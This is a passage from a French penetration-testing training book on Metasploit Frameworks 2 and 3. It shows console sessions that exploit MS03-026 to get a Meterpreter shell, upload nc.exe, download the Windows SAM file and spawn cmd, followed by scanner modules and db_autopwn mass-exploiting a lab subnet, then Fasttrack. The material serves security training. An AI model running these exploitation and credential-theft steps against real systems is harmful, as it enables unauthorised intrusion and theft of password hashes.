Une fenêtre VNC apparaît alors si l’exploit a fonctionné.![images/04EP11.png](https://www.eni-training.com/download/e6942060-4181-4dd7-bce3-601625551eb9/images/04EP11.png?id=AAEAAAD%2f%2f%2f%2f%2fAQAAAAAAAAAMAgAAAE1FbmkuRWRpdGlvbnMuTWVkaWFwbHVzLCBWZXJzaW9uPTEuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49bnVsbAUBAAAAJ0VuaS5FZGl0aW9ucy5NZWRpYXBsdXMuQ29tbW9uLldhdGVybWFyawIAAAAHcGlzVGV4dAlwaWR0ZURhdGUBAA0CAAAABgMAAAA0Um90ZW4gQ8OpZHJpYyAtIGNlNmMyNzBjLWU3NjMtNDYwZC05MzZlLTc3ZmZhMTBmMjAzYUAn10qU0tiICw%3d%3d)

#### d. Meterpreter Payload

Meterpreter est un payload multifonction avancé qui va nous fournir un shell basique à partir duquel nous pourrons ajouter les fonctions désirées pour notre exploit.

Meterpreter est un payload car il permet d’avoir un shell particulier qui va vous permettre de n’envoyer que la partie utile de vos messages \(commandes\) sans encapsulation des en-têtes du protocole TCP/IP par exemple.

Meterpreter est très pratique parce qu’il nous proposera un shell meterpreter qui va nous permettre bien plus d’actions qu’un payload classique. Nous pourrons lancer à partir du shell meterpreter un shell bash, déposer ou télécharger des fichiers, des exécutables, faire des dumps mémoire…

```text

msf > use msrpc_dcom_ms03_026  
msf msrpc_dcom_ms03_026 > show payloads  
Metasploit Framework Usable Payloads  
====================================  
win32_adduser  
win32_bind  
win32_bind_dllinject  
win32_bind_meterpreter  
win32_bind_stg  
win32_bind_stg_upexec  
win32_bind_vncinject  
win32_downloadexec  
Windows Execute net user /ADD  
Windows Bind Shell  
Windows Bind DLL Inject  
Windows Bind Meterpreter DLL Inject  
Windows Staged Bind Shell  
Windows Staged Bind Upload/Execute  
Windows Bind VNC Server DLL Inject  
Windows Executable Download and Executewin32_exec  
Windows Execute Command  
win32_passivex  
Windows PassiveX ActiveX Injection Payload  
win32_passivex_meterpreter  
win32_passivex_stg  
Windows Staged PassiveX Shell  
win32_passivex_vncinject  
win32_reverse  
Windows PassiveX ActiveX Inject Meterpreter Payload  
Windows PassiveX ActiveX Inject VNC Server Payload  
Windows Reverse Shell  
win32_reverse_dllinject  
Windows Reverse DLL Inject  
win32_reverse_meterpreter  
win32_reverse_ord  
Windows Reverse Meterpreter DLL Inject  
Windows Staged Reverse Ordinal Shell  
win32_reverse_ord_vncinject Windows Reverse Ordinal VNC Server 
Inject  
win32_reverse_stg  
Windows Staged Reverse Shell  
win32_reverse_stg_upexec  
win32_reverse_vncinject  
Windows Staged Reverse Upload/Execute  
Windows Reverse VNC Server Inject  
msf msrpc_dcom_ms03_026(in32_bind_meterpreter) > set PAYLOAD 
win32_bind_meterpreter  
PAYLOAD -> win32_bind_meterpreter  
msf msrpc_dcom_ms03_026(win32_bind_meterpreter) > set RHOST 
192.168.9.14  
RHOST -> 192.168.9.14  
msf msrpc_dcom_ms03_026(win32_bind_meterpreter) > exploit  
[*] Starting Reverse Handler.  
[*] Sending request...  
[*] Got connection from 192.168.9.100:4321 <-> 192.168.9.14:1031  
meterpreter>
```

Nous obtenons un shell meterpreter.

Il faut maintenant charger le système de fichiers et des librairies dans meterpreter.

```text

meterpreter> use -m Process  
loadlib: Loading library from 'ext180401.dll' on the remote 
machine.  
Meterpreter>  
loadlib: success.  
meterpreter> use -m Fs  
loadlib: Loading library from 'ext290706.dll' on the remote 
machine.  
meterpreter>  
loadlib: success.  
meterpreter> help
```

Nous pouvons maintenant envoyer ou télécharger des fichiers, exécuter des commandes shell, gérer les processus en interactivité avec eux...

```text

meterpreter> upload /home/fasm/windows-binaries/tools/nc.exe 
c:\windows  
upload: Starting upload of '/home/fasm/windows-
binaries/tools/nc.exe' to 'c:\windows\nc.exe'.  
upload: 1 uploads started.  
meterpreter>  
upload: Upload from '/home/fasm/windows-binaries/tools/nc.exe' 
succeeded.  
meterpreter> download c:\windows\repair\sam /tmp  
download: Starting download from 'c:\windows\repair\sam' to 
'/tmp/sam'...  
download: 1 downloads started.  
meterpreter>  
download: Download to '/tmp/sam' succeeded.  
meterpreter>  
meterpreter> ps  
meterpreter>  
Process list:  
Pid  
Name Path  
----- ------------ ----------  
00360 smss.exe \SystemRoot\System32\smss.exe  
00528 csrss.exe \??\C:\WINDOWS\system32\csrss.exe  
00556 winlogon.exe \??\C:\WINDOWS\system32\winlogon.exe  
00604 services.exe C:\WINDOWS\system32\services.exe  
00616  
lsass.exe C:\WINDOWS\system32\lsass.exe  
00864 svchost.exe C:\WINDOWS\system32\svchost.exe  
01008 svchost.exe C:\WINDOWS\System32\svchost.exe  
01084 svchost.exe C:\WINDOWS\System32\svchost.exe  
01156 svchost.exe C:\WINDOWS\System32\svchost.exe  
01360 spoolsv.exe C:\WINDOWS\system32\spoolsv.exe  
01588 VMwareService.exe C:\Program Files\VMware\VMware 
Tools\VMwareService.exe  
01172 Explorer.EXE C:\WINDOWS\Explorer.EXE  
01048 VMwareTray.exe C:\Program Files\VMware\VMware 
Tools\VMwareTray.exe  
01292 VMwareUser.exe  
C:\Program Files\VMware\VMware Tools\VMwareUser.exe  
01776 cmd.exe C:\WINDOWS\System32\cmd.exe  
01168 logon.scr C:\WINDOWS\System32\logon.scr  
17 processes.  
Meterpreter> 
meterpreter> execute -H -f cmd -c  
execute: Executing 'cmd'...  
meterpreter>  
execute: success, process id is 492.  
execute: allocated channel 6 for new process.  
meterpreter> interact 6  
interact: Switching to interactive console on 6...  
meterpreter>  
interact: Started interactive channel 6.  
Microsoft Windows XP [Version 5.1.2600]  
(C) Copyright 1985-2001 Microsoft Corp.  
C:\WINDOWS\system32>exit  
exit  
interact: Ending interactive session.  
Meterpreter>
```

#### e. Framework 3

Le framework 3 a été complètement réécrit en Ruby. La philosophie est la même que pour le framework 2.

Les frameworks 2 et 3 sont inclus par défaut dans la BackTrack. Tout ce que nous avons vu avant est donc valable pour cette version.

**Modules auxiliaires**

Le framework 3 a intégré des modules auxiliaires très utiles comme **UDP discovery sweeps** et **SMB host identification features**.

```text

framework3 # ./msfconsole  
=[ msf v3.0-beta-dev  
+ -- --=[ 132 exploits - 99 payloads  
+ -- --=[ 17 encoders - 4 nops  
=[ 27 aux  
msf > show  
msf > use scanner/discovery/sweep_udp  
msf auxiliary(sweep_udp) > set RHOSTS 172.16.2.1/24  
RHOSTS => 172.16.2.1/24  
msf auxiliary(sweep_udp) > run  
[*] Sending 6 probes to 172.16.2.0->172.16.2.255 (256 hosts)  
[*] Discovered NetBIOS on 172.16.2.203 ()  
[*] Discovered NetBIOS on 172.16.2.204 ()  
[*] Discovered NetBIOS on 172.16.2.202 ()  
[*] Discovered NetBIOS on 172.16.2.201 ()  
[*] Discovered SQL Server on 172.16.2.201 
(tcp=1433np=\\BA8C9725C4334BF\pipe\sql\query Version=8.00.194  
ServerName=BA8C9725C4334BF  
IsClustered=No InstanceName=MSSQLSERVER )  
[*] Auxiliary module execution completed  
msf auxiliary(sweep_udp) > use scanner/smb/version  
msf auxiliary(version) > set RHOSTS 172.16.2.201-172.16.2.204  
RHOSTS => 172.16.2.201-172.16.2.204  
msf auxiliary(version) > run  
[*] 172.16.2.201 is running Windows 2000 Service Pack 0 - Service
Pack 4  
[*] 172.16.2.202 is running Windows XP Service Pack 0 / Service 
Pack 1  
[*] 172.16.2.203 is running Windows XP Service Pack 0 / Service 
Pack 1  
[*] 172.16.2.204 is running Windows XP Service Pack 0 / Service 
Pack 1  
[*] Auxiliary module execution completed  
msf auxiliary(version) > use scanner/mssql/mssql_ping  
msf auxiliary(mssql_ping) > set RHOSTS 172.16.2.201  
RHOSTS => 172.16.2.201  
msf auxiliary(mssql_ping) > run  
[*] SQL Server information for 172.16.2.201:  
[*] tcp = 1433  
[*] np = \\BA8C9725C4334BF\pipe\sql\query  
[*] Version  
= 8.00.194  
[*] ServerName  
[*] IsClustered  
[*] InstanceName  
= BA8C9725C4334BF  
= No  
= MSSQLSERVER  
[*] Auxiliary module execution completed  
msf auxiliary(mssql_ping) > use scanner/mssql/mssql_login  
msf auxiliary(mssql_login) > set RHOSTS 172.16.2.201  
RHOSTS => 172.16.2.201  
msf auxiliary(mssql_login) > run  
[*] Target 172.16.2.201 does have a null sa account...  
[*] Auxiliary module execution completed
```

**db\_autopwn**

Le module db\_autopwn peut être utilisé pour le port scanning et la connexion aux ordinateurs en utilisant Nmap \(db\_nmap\), tous les résultats sont entrés dans une base de données Postgres.

Suivant les ports ouverts découverts par le scan, Metasploit exécute automatiquement des exploits contre ces machines.

db\_autopwn n’est plus géré par Metasploit mais il est toujours possible de l’utiliser.

Il nous faudra récupérer db\_autopwn.rb sur Internet : [https://github.com/jeffbryner/kinectasploit/blob/master/db\_autopwn.rb](https://github.com/jeffbryner/kinectasploit/blob/master/db_autopwn.rb)

Nous sauvegarderons ce programme dans /pentest/exploits/framework/plugins/db\_autopwn.rb :

```text

root@bt:~# su postgres  
sh-4.1$ psql  
could not change directory to "/root"  
psql (8.4.8)  
Type "help" for help.  
postgres=# create user test with password 'test';  
CREATE ROLE  
postgres=# create database cdaisi_db;  
CREATE DATABASE  
postgres=# 
```

```text

msfconsole  
db_connect test:test@127.0.0.1/cdaisi_db  
db_nmap 213.136.96.12  
load db_autopwn  
db_autopwn -t -p -e -s -b
```

```text

framework3 # ./start-db_autopwn  
The files belonging to this database system will be owned by user 
"postgres".  
This user must also own the server process.  
The database cluster will be initialized with locale C.  
creating directory /home/postgres/metasploit3 ... ok  
creating directory /home/postgres/metasploit3/global ... ok  
...  
initializing dependencies ... ok  
creating system views ... ok  
loading pg_description ... ok  
creating conversions ... ok  
setting privileges on built-in objects ... ok  
creating information schema ... ok  
vacuuming database template1 ... ok  
copying template1 to template0 ... ok  
copying template1 to postgres ... ok  
WARNING: enabling "trust" authentication for local connections  
You can change this by editing pg_hba.conf or using the -A option 
the next time you run initdb.  
Success. You can now start the database server using:  
postmaster -D /home/postgres/metasploit3  
or pg_ctl -D /home/postgres/metasploit3 -l logfile start  
postmaster starting  
[**************************************************************] 
[*] Postgres should be setup now. To run db_autopwn, please:  
[*] # su - postgres[*] # cd /home/fasm/framework3  
{*] # ./msfconsole  
[*] msf> load db_postgres  
[**************************************************************] 
BT framework3 # LOG: database system was shut down at 2006-12-10 
06:53:28 GMT  
LOG: checkpoint record is at 0/33A6AC  
LOG: redo record is at 0/33A6AC; undo record is at 0/0; shutdown 
TRUE  
LOG: next transaction ID: 565; next OID: 10794  
LOG: next MultiXactId: 1; next MultiXactOffset: 0  
LOG: database system is ready  
LOG: transaction ID wrap limit is 2147484146, limited by database 
"postgres"  
BT framework3 # su - postgres  
/dev/pts/0: Operation not permitted  
BT ~ $ cd /home/fasm/framework3  
BT framework3 $ ./msfconsole  
____________  
< metasploit >  
------------  
=[ msf v3.0-beta-dev  
+ -- --=[ 131 exploits - 99 payloads  
+ -- --=[ 17 encoders - 4 nops  
=[ 27 aux  
msf > load db_postgres  
[*] Successfully loaded plugin: db_postgres  
msf > db_create  
ERROR: database "metasploit3" does not exist  
dropdb: database removal failed: ERROR: database "metasploit3" 
does not exist 
 LOG: transaction ID wrap limit is 2147484146, limited by database 
"postgres"  
CREATE DATABASE  
ERROR: table "hosts" does not exist  
ERROR: table "hosts" does not exist  
NOTICE: CREATE TABLE will create sequence "hosts_id_seq" for 
serial column  
"hosts.id"NOTICE: CREATE TABLE / PRIMARY KEY will create implicit 
index "refs_pkey" for table "refs"  
NOTICE: CREATE TABLE / PRIMARY KEY will create implicit index 
"refs_pkey" for table "refs"  
ERROR: table "vulns_refs" does not exist  
ERROR: table "vulns_refs" does not exist  
msf > db_hosts  
msf > db_nmap-p 445 172.16.2.*  
Starting Nmap 4.11 ( http://www.insecure.org/nmap/ ) at 2006-12-10 
06:56 GMT  
Interesting ports on 172.16.2.1:  
PORT STATE SERVICE  
445/tcp closed microsoft-ds  
Nmap finished: 256 IP addresses (1 host up) scanned in 15.476 
seconds  
msf > db_Nmap-p 445 172.16.2.*  
Starting Nmap 4.11 ( http://www.insecure.org/nmap/ ) at 2006-12-10 
06:57 GMT  
Interesting ports on 172.16.2.1:  
PORT STATE SERVICE  
445/tcp closed microsoft-ds  
Interesting ports on 172.16.2.202:  
PORT STATE SERVICE  
445/tcp open microsoft-ds  
Interesting ports on 172.16.2.203:  
PORT STATE SERVICE  
445/tcp open microsoft-ds  
Interesting ports on 172.16.2.206:  
PORT STATE SERVICE  
445/tcp open microsoft-ds  
Nmap finished: 256 IP addresses (4 hosts up) scanned in 15.323 
seconds  
msf > db_hosts  
[*] Host: 172.16.2.202  
[*] Host: 172.16.2.203  
[*] Host: 172.16.2.206  
msf > db_autopwn -p -e -r  
[*] Launching auxiliary/dos/windows/smb/ms05_047_pnp (1/42) 
against 172.16.2.206:445...  
[*] Launching exploit/windows/smb/ms06_066_nwwks (2/42) against 
172.16.2.203:445...  
[*] Started reverse handler  
[*] Launching exploit/windows/smb/ms06_040_netapi (3/42) against 
172.16.2.202:445...[*] Connecting to the SMB service...  
[*] Started reverse handler  
[*] Launching exploit/windows/smb/ms03_049_netapi (5/42) against 
172.16.2.203:445...  
[*] Connecting to the SMB service...  
[*] Launching exploit/windows/smb/ms05_039_pnp (10/42) against 
172.16.2.206:445...  
[*] Bound to 3919286a-b10c-11d0-9ba8-  
00c04fd92ef5:0.0@ncacn_np:172.16.2.202[\lsarpc]...  
[*] Getting OS information...  
[*] Command shell session 2 opened (172.16.2.1:8368 -> 
172.16.2.202:1059)  
[*] Trying to exploit Windows 5.1  
[*] Command shell session 3 opened (172.16.2.1:22349 -> 
172.16.2.206:1041)  
msf > sessions -l  
Active sessions  
===============  
Id Description Tunnel  
-- -----------  
------  
1 Command shell 172.16.2.1:23443 -> 172.16.2.202:1058  
2 Command shell 172.16.2.1:12927 -> 172.16.2.203:1099  
3 Command shell 172.16.2.1:37995 -> 172.16.2.206:1040  
msf > sessions -i 1  
[*] Starting interaction with 1...  
Microsoft Windows XP [Version 5.1.2600]  
(C) Copyright 1985-2001 Microsoft Corp.  
C:\WINDOWS\system32>
```

#### f. Fasttrack

Fasttrack permet d’automatiser même db\_autopwn, nous pourrons donc le tester.

Pour cela, il faut faire aussi une petite modification avant que ce dernier ne fonctionne.

Allons dans le répertoire /pentest/exploits/fasttrack/bin/ftsrc et ouvrons le fichier autopwn.py :![images/04EP12.png](https://www.eni-training.com/download/e6942060-4181-4dd7-bce3-601625551eb9/images/04EP12.png?id=AAEAAAD%2f%2f%2f%2f%2fAQAAAAAAAAAMAgAAAE1FbmkuRWRpdGlvbnMuTWVkaWFwbHVzLCBWZXJzaW9uPTEuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49bnVsbAUBAAAAJ0VuaS5FZGl0aW9ucy5NZWRpYXBsdXMuQ29tbW9uLldhdGVybWFyawIAAAAHcGlzVGV4dAlwaWR0ZURhdGUBAA0CAAAABgMAAAA0Um90ZW4gQ8OpZHJpYyAtIGNlNmMyNzBjLWU3NjMtNDYwZC05MzZlLTc3ZmZhMTBmMjAzYUAn10qU0tiICw%3d%3d)

Nous pouvons ajouter la ligne en face du curseur \(carré blanc\) et ensuite enregistrer le fichier.

Nous pouvons maintenant utiliser db\_autopwn et fasttrack.

Si nous lançons fasttrack simplement, nous obtenons cela :

```text

------------------------------------------------ 
Fast-Track v3.0 - Where speed really does matter... 
Automated Penetration Testing 
Written by David Kennedy (ReL1K) 
SecureState, LLC 
http://www.securestate.com 
dkennedy@securestate.com 
Please read the README and LICENSE before using 
this tool for acceptable use and modifications. 
------------------------------------------------- 
Modes: 
Interactive Menu Driven Mode: -i 
Command Line Mode: -c 
Web GUI Mode -g 
Examples: ./fast-track.py -i 
          ./fast-track.py -c 
          ./fast-track.py -g 
          ./fast-track.py -g <portnum> 
Usage: ./fast-track.py <mode> 
```

Nous lancerons donc ./fasttrack -i

Il ne nous reste plus qu’à suivre les indications pour exécuter autopwn.

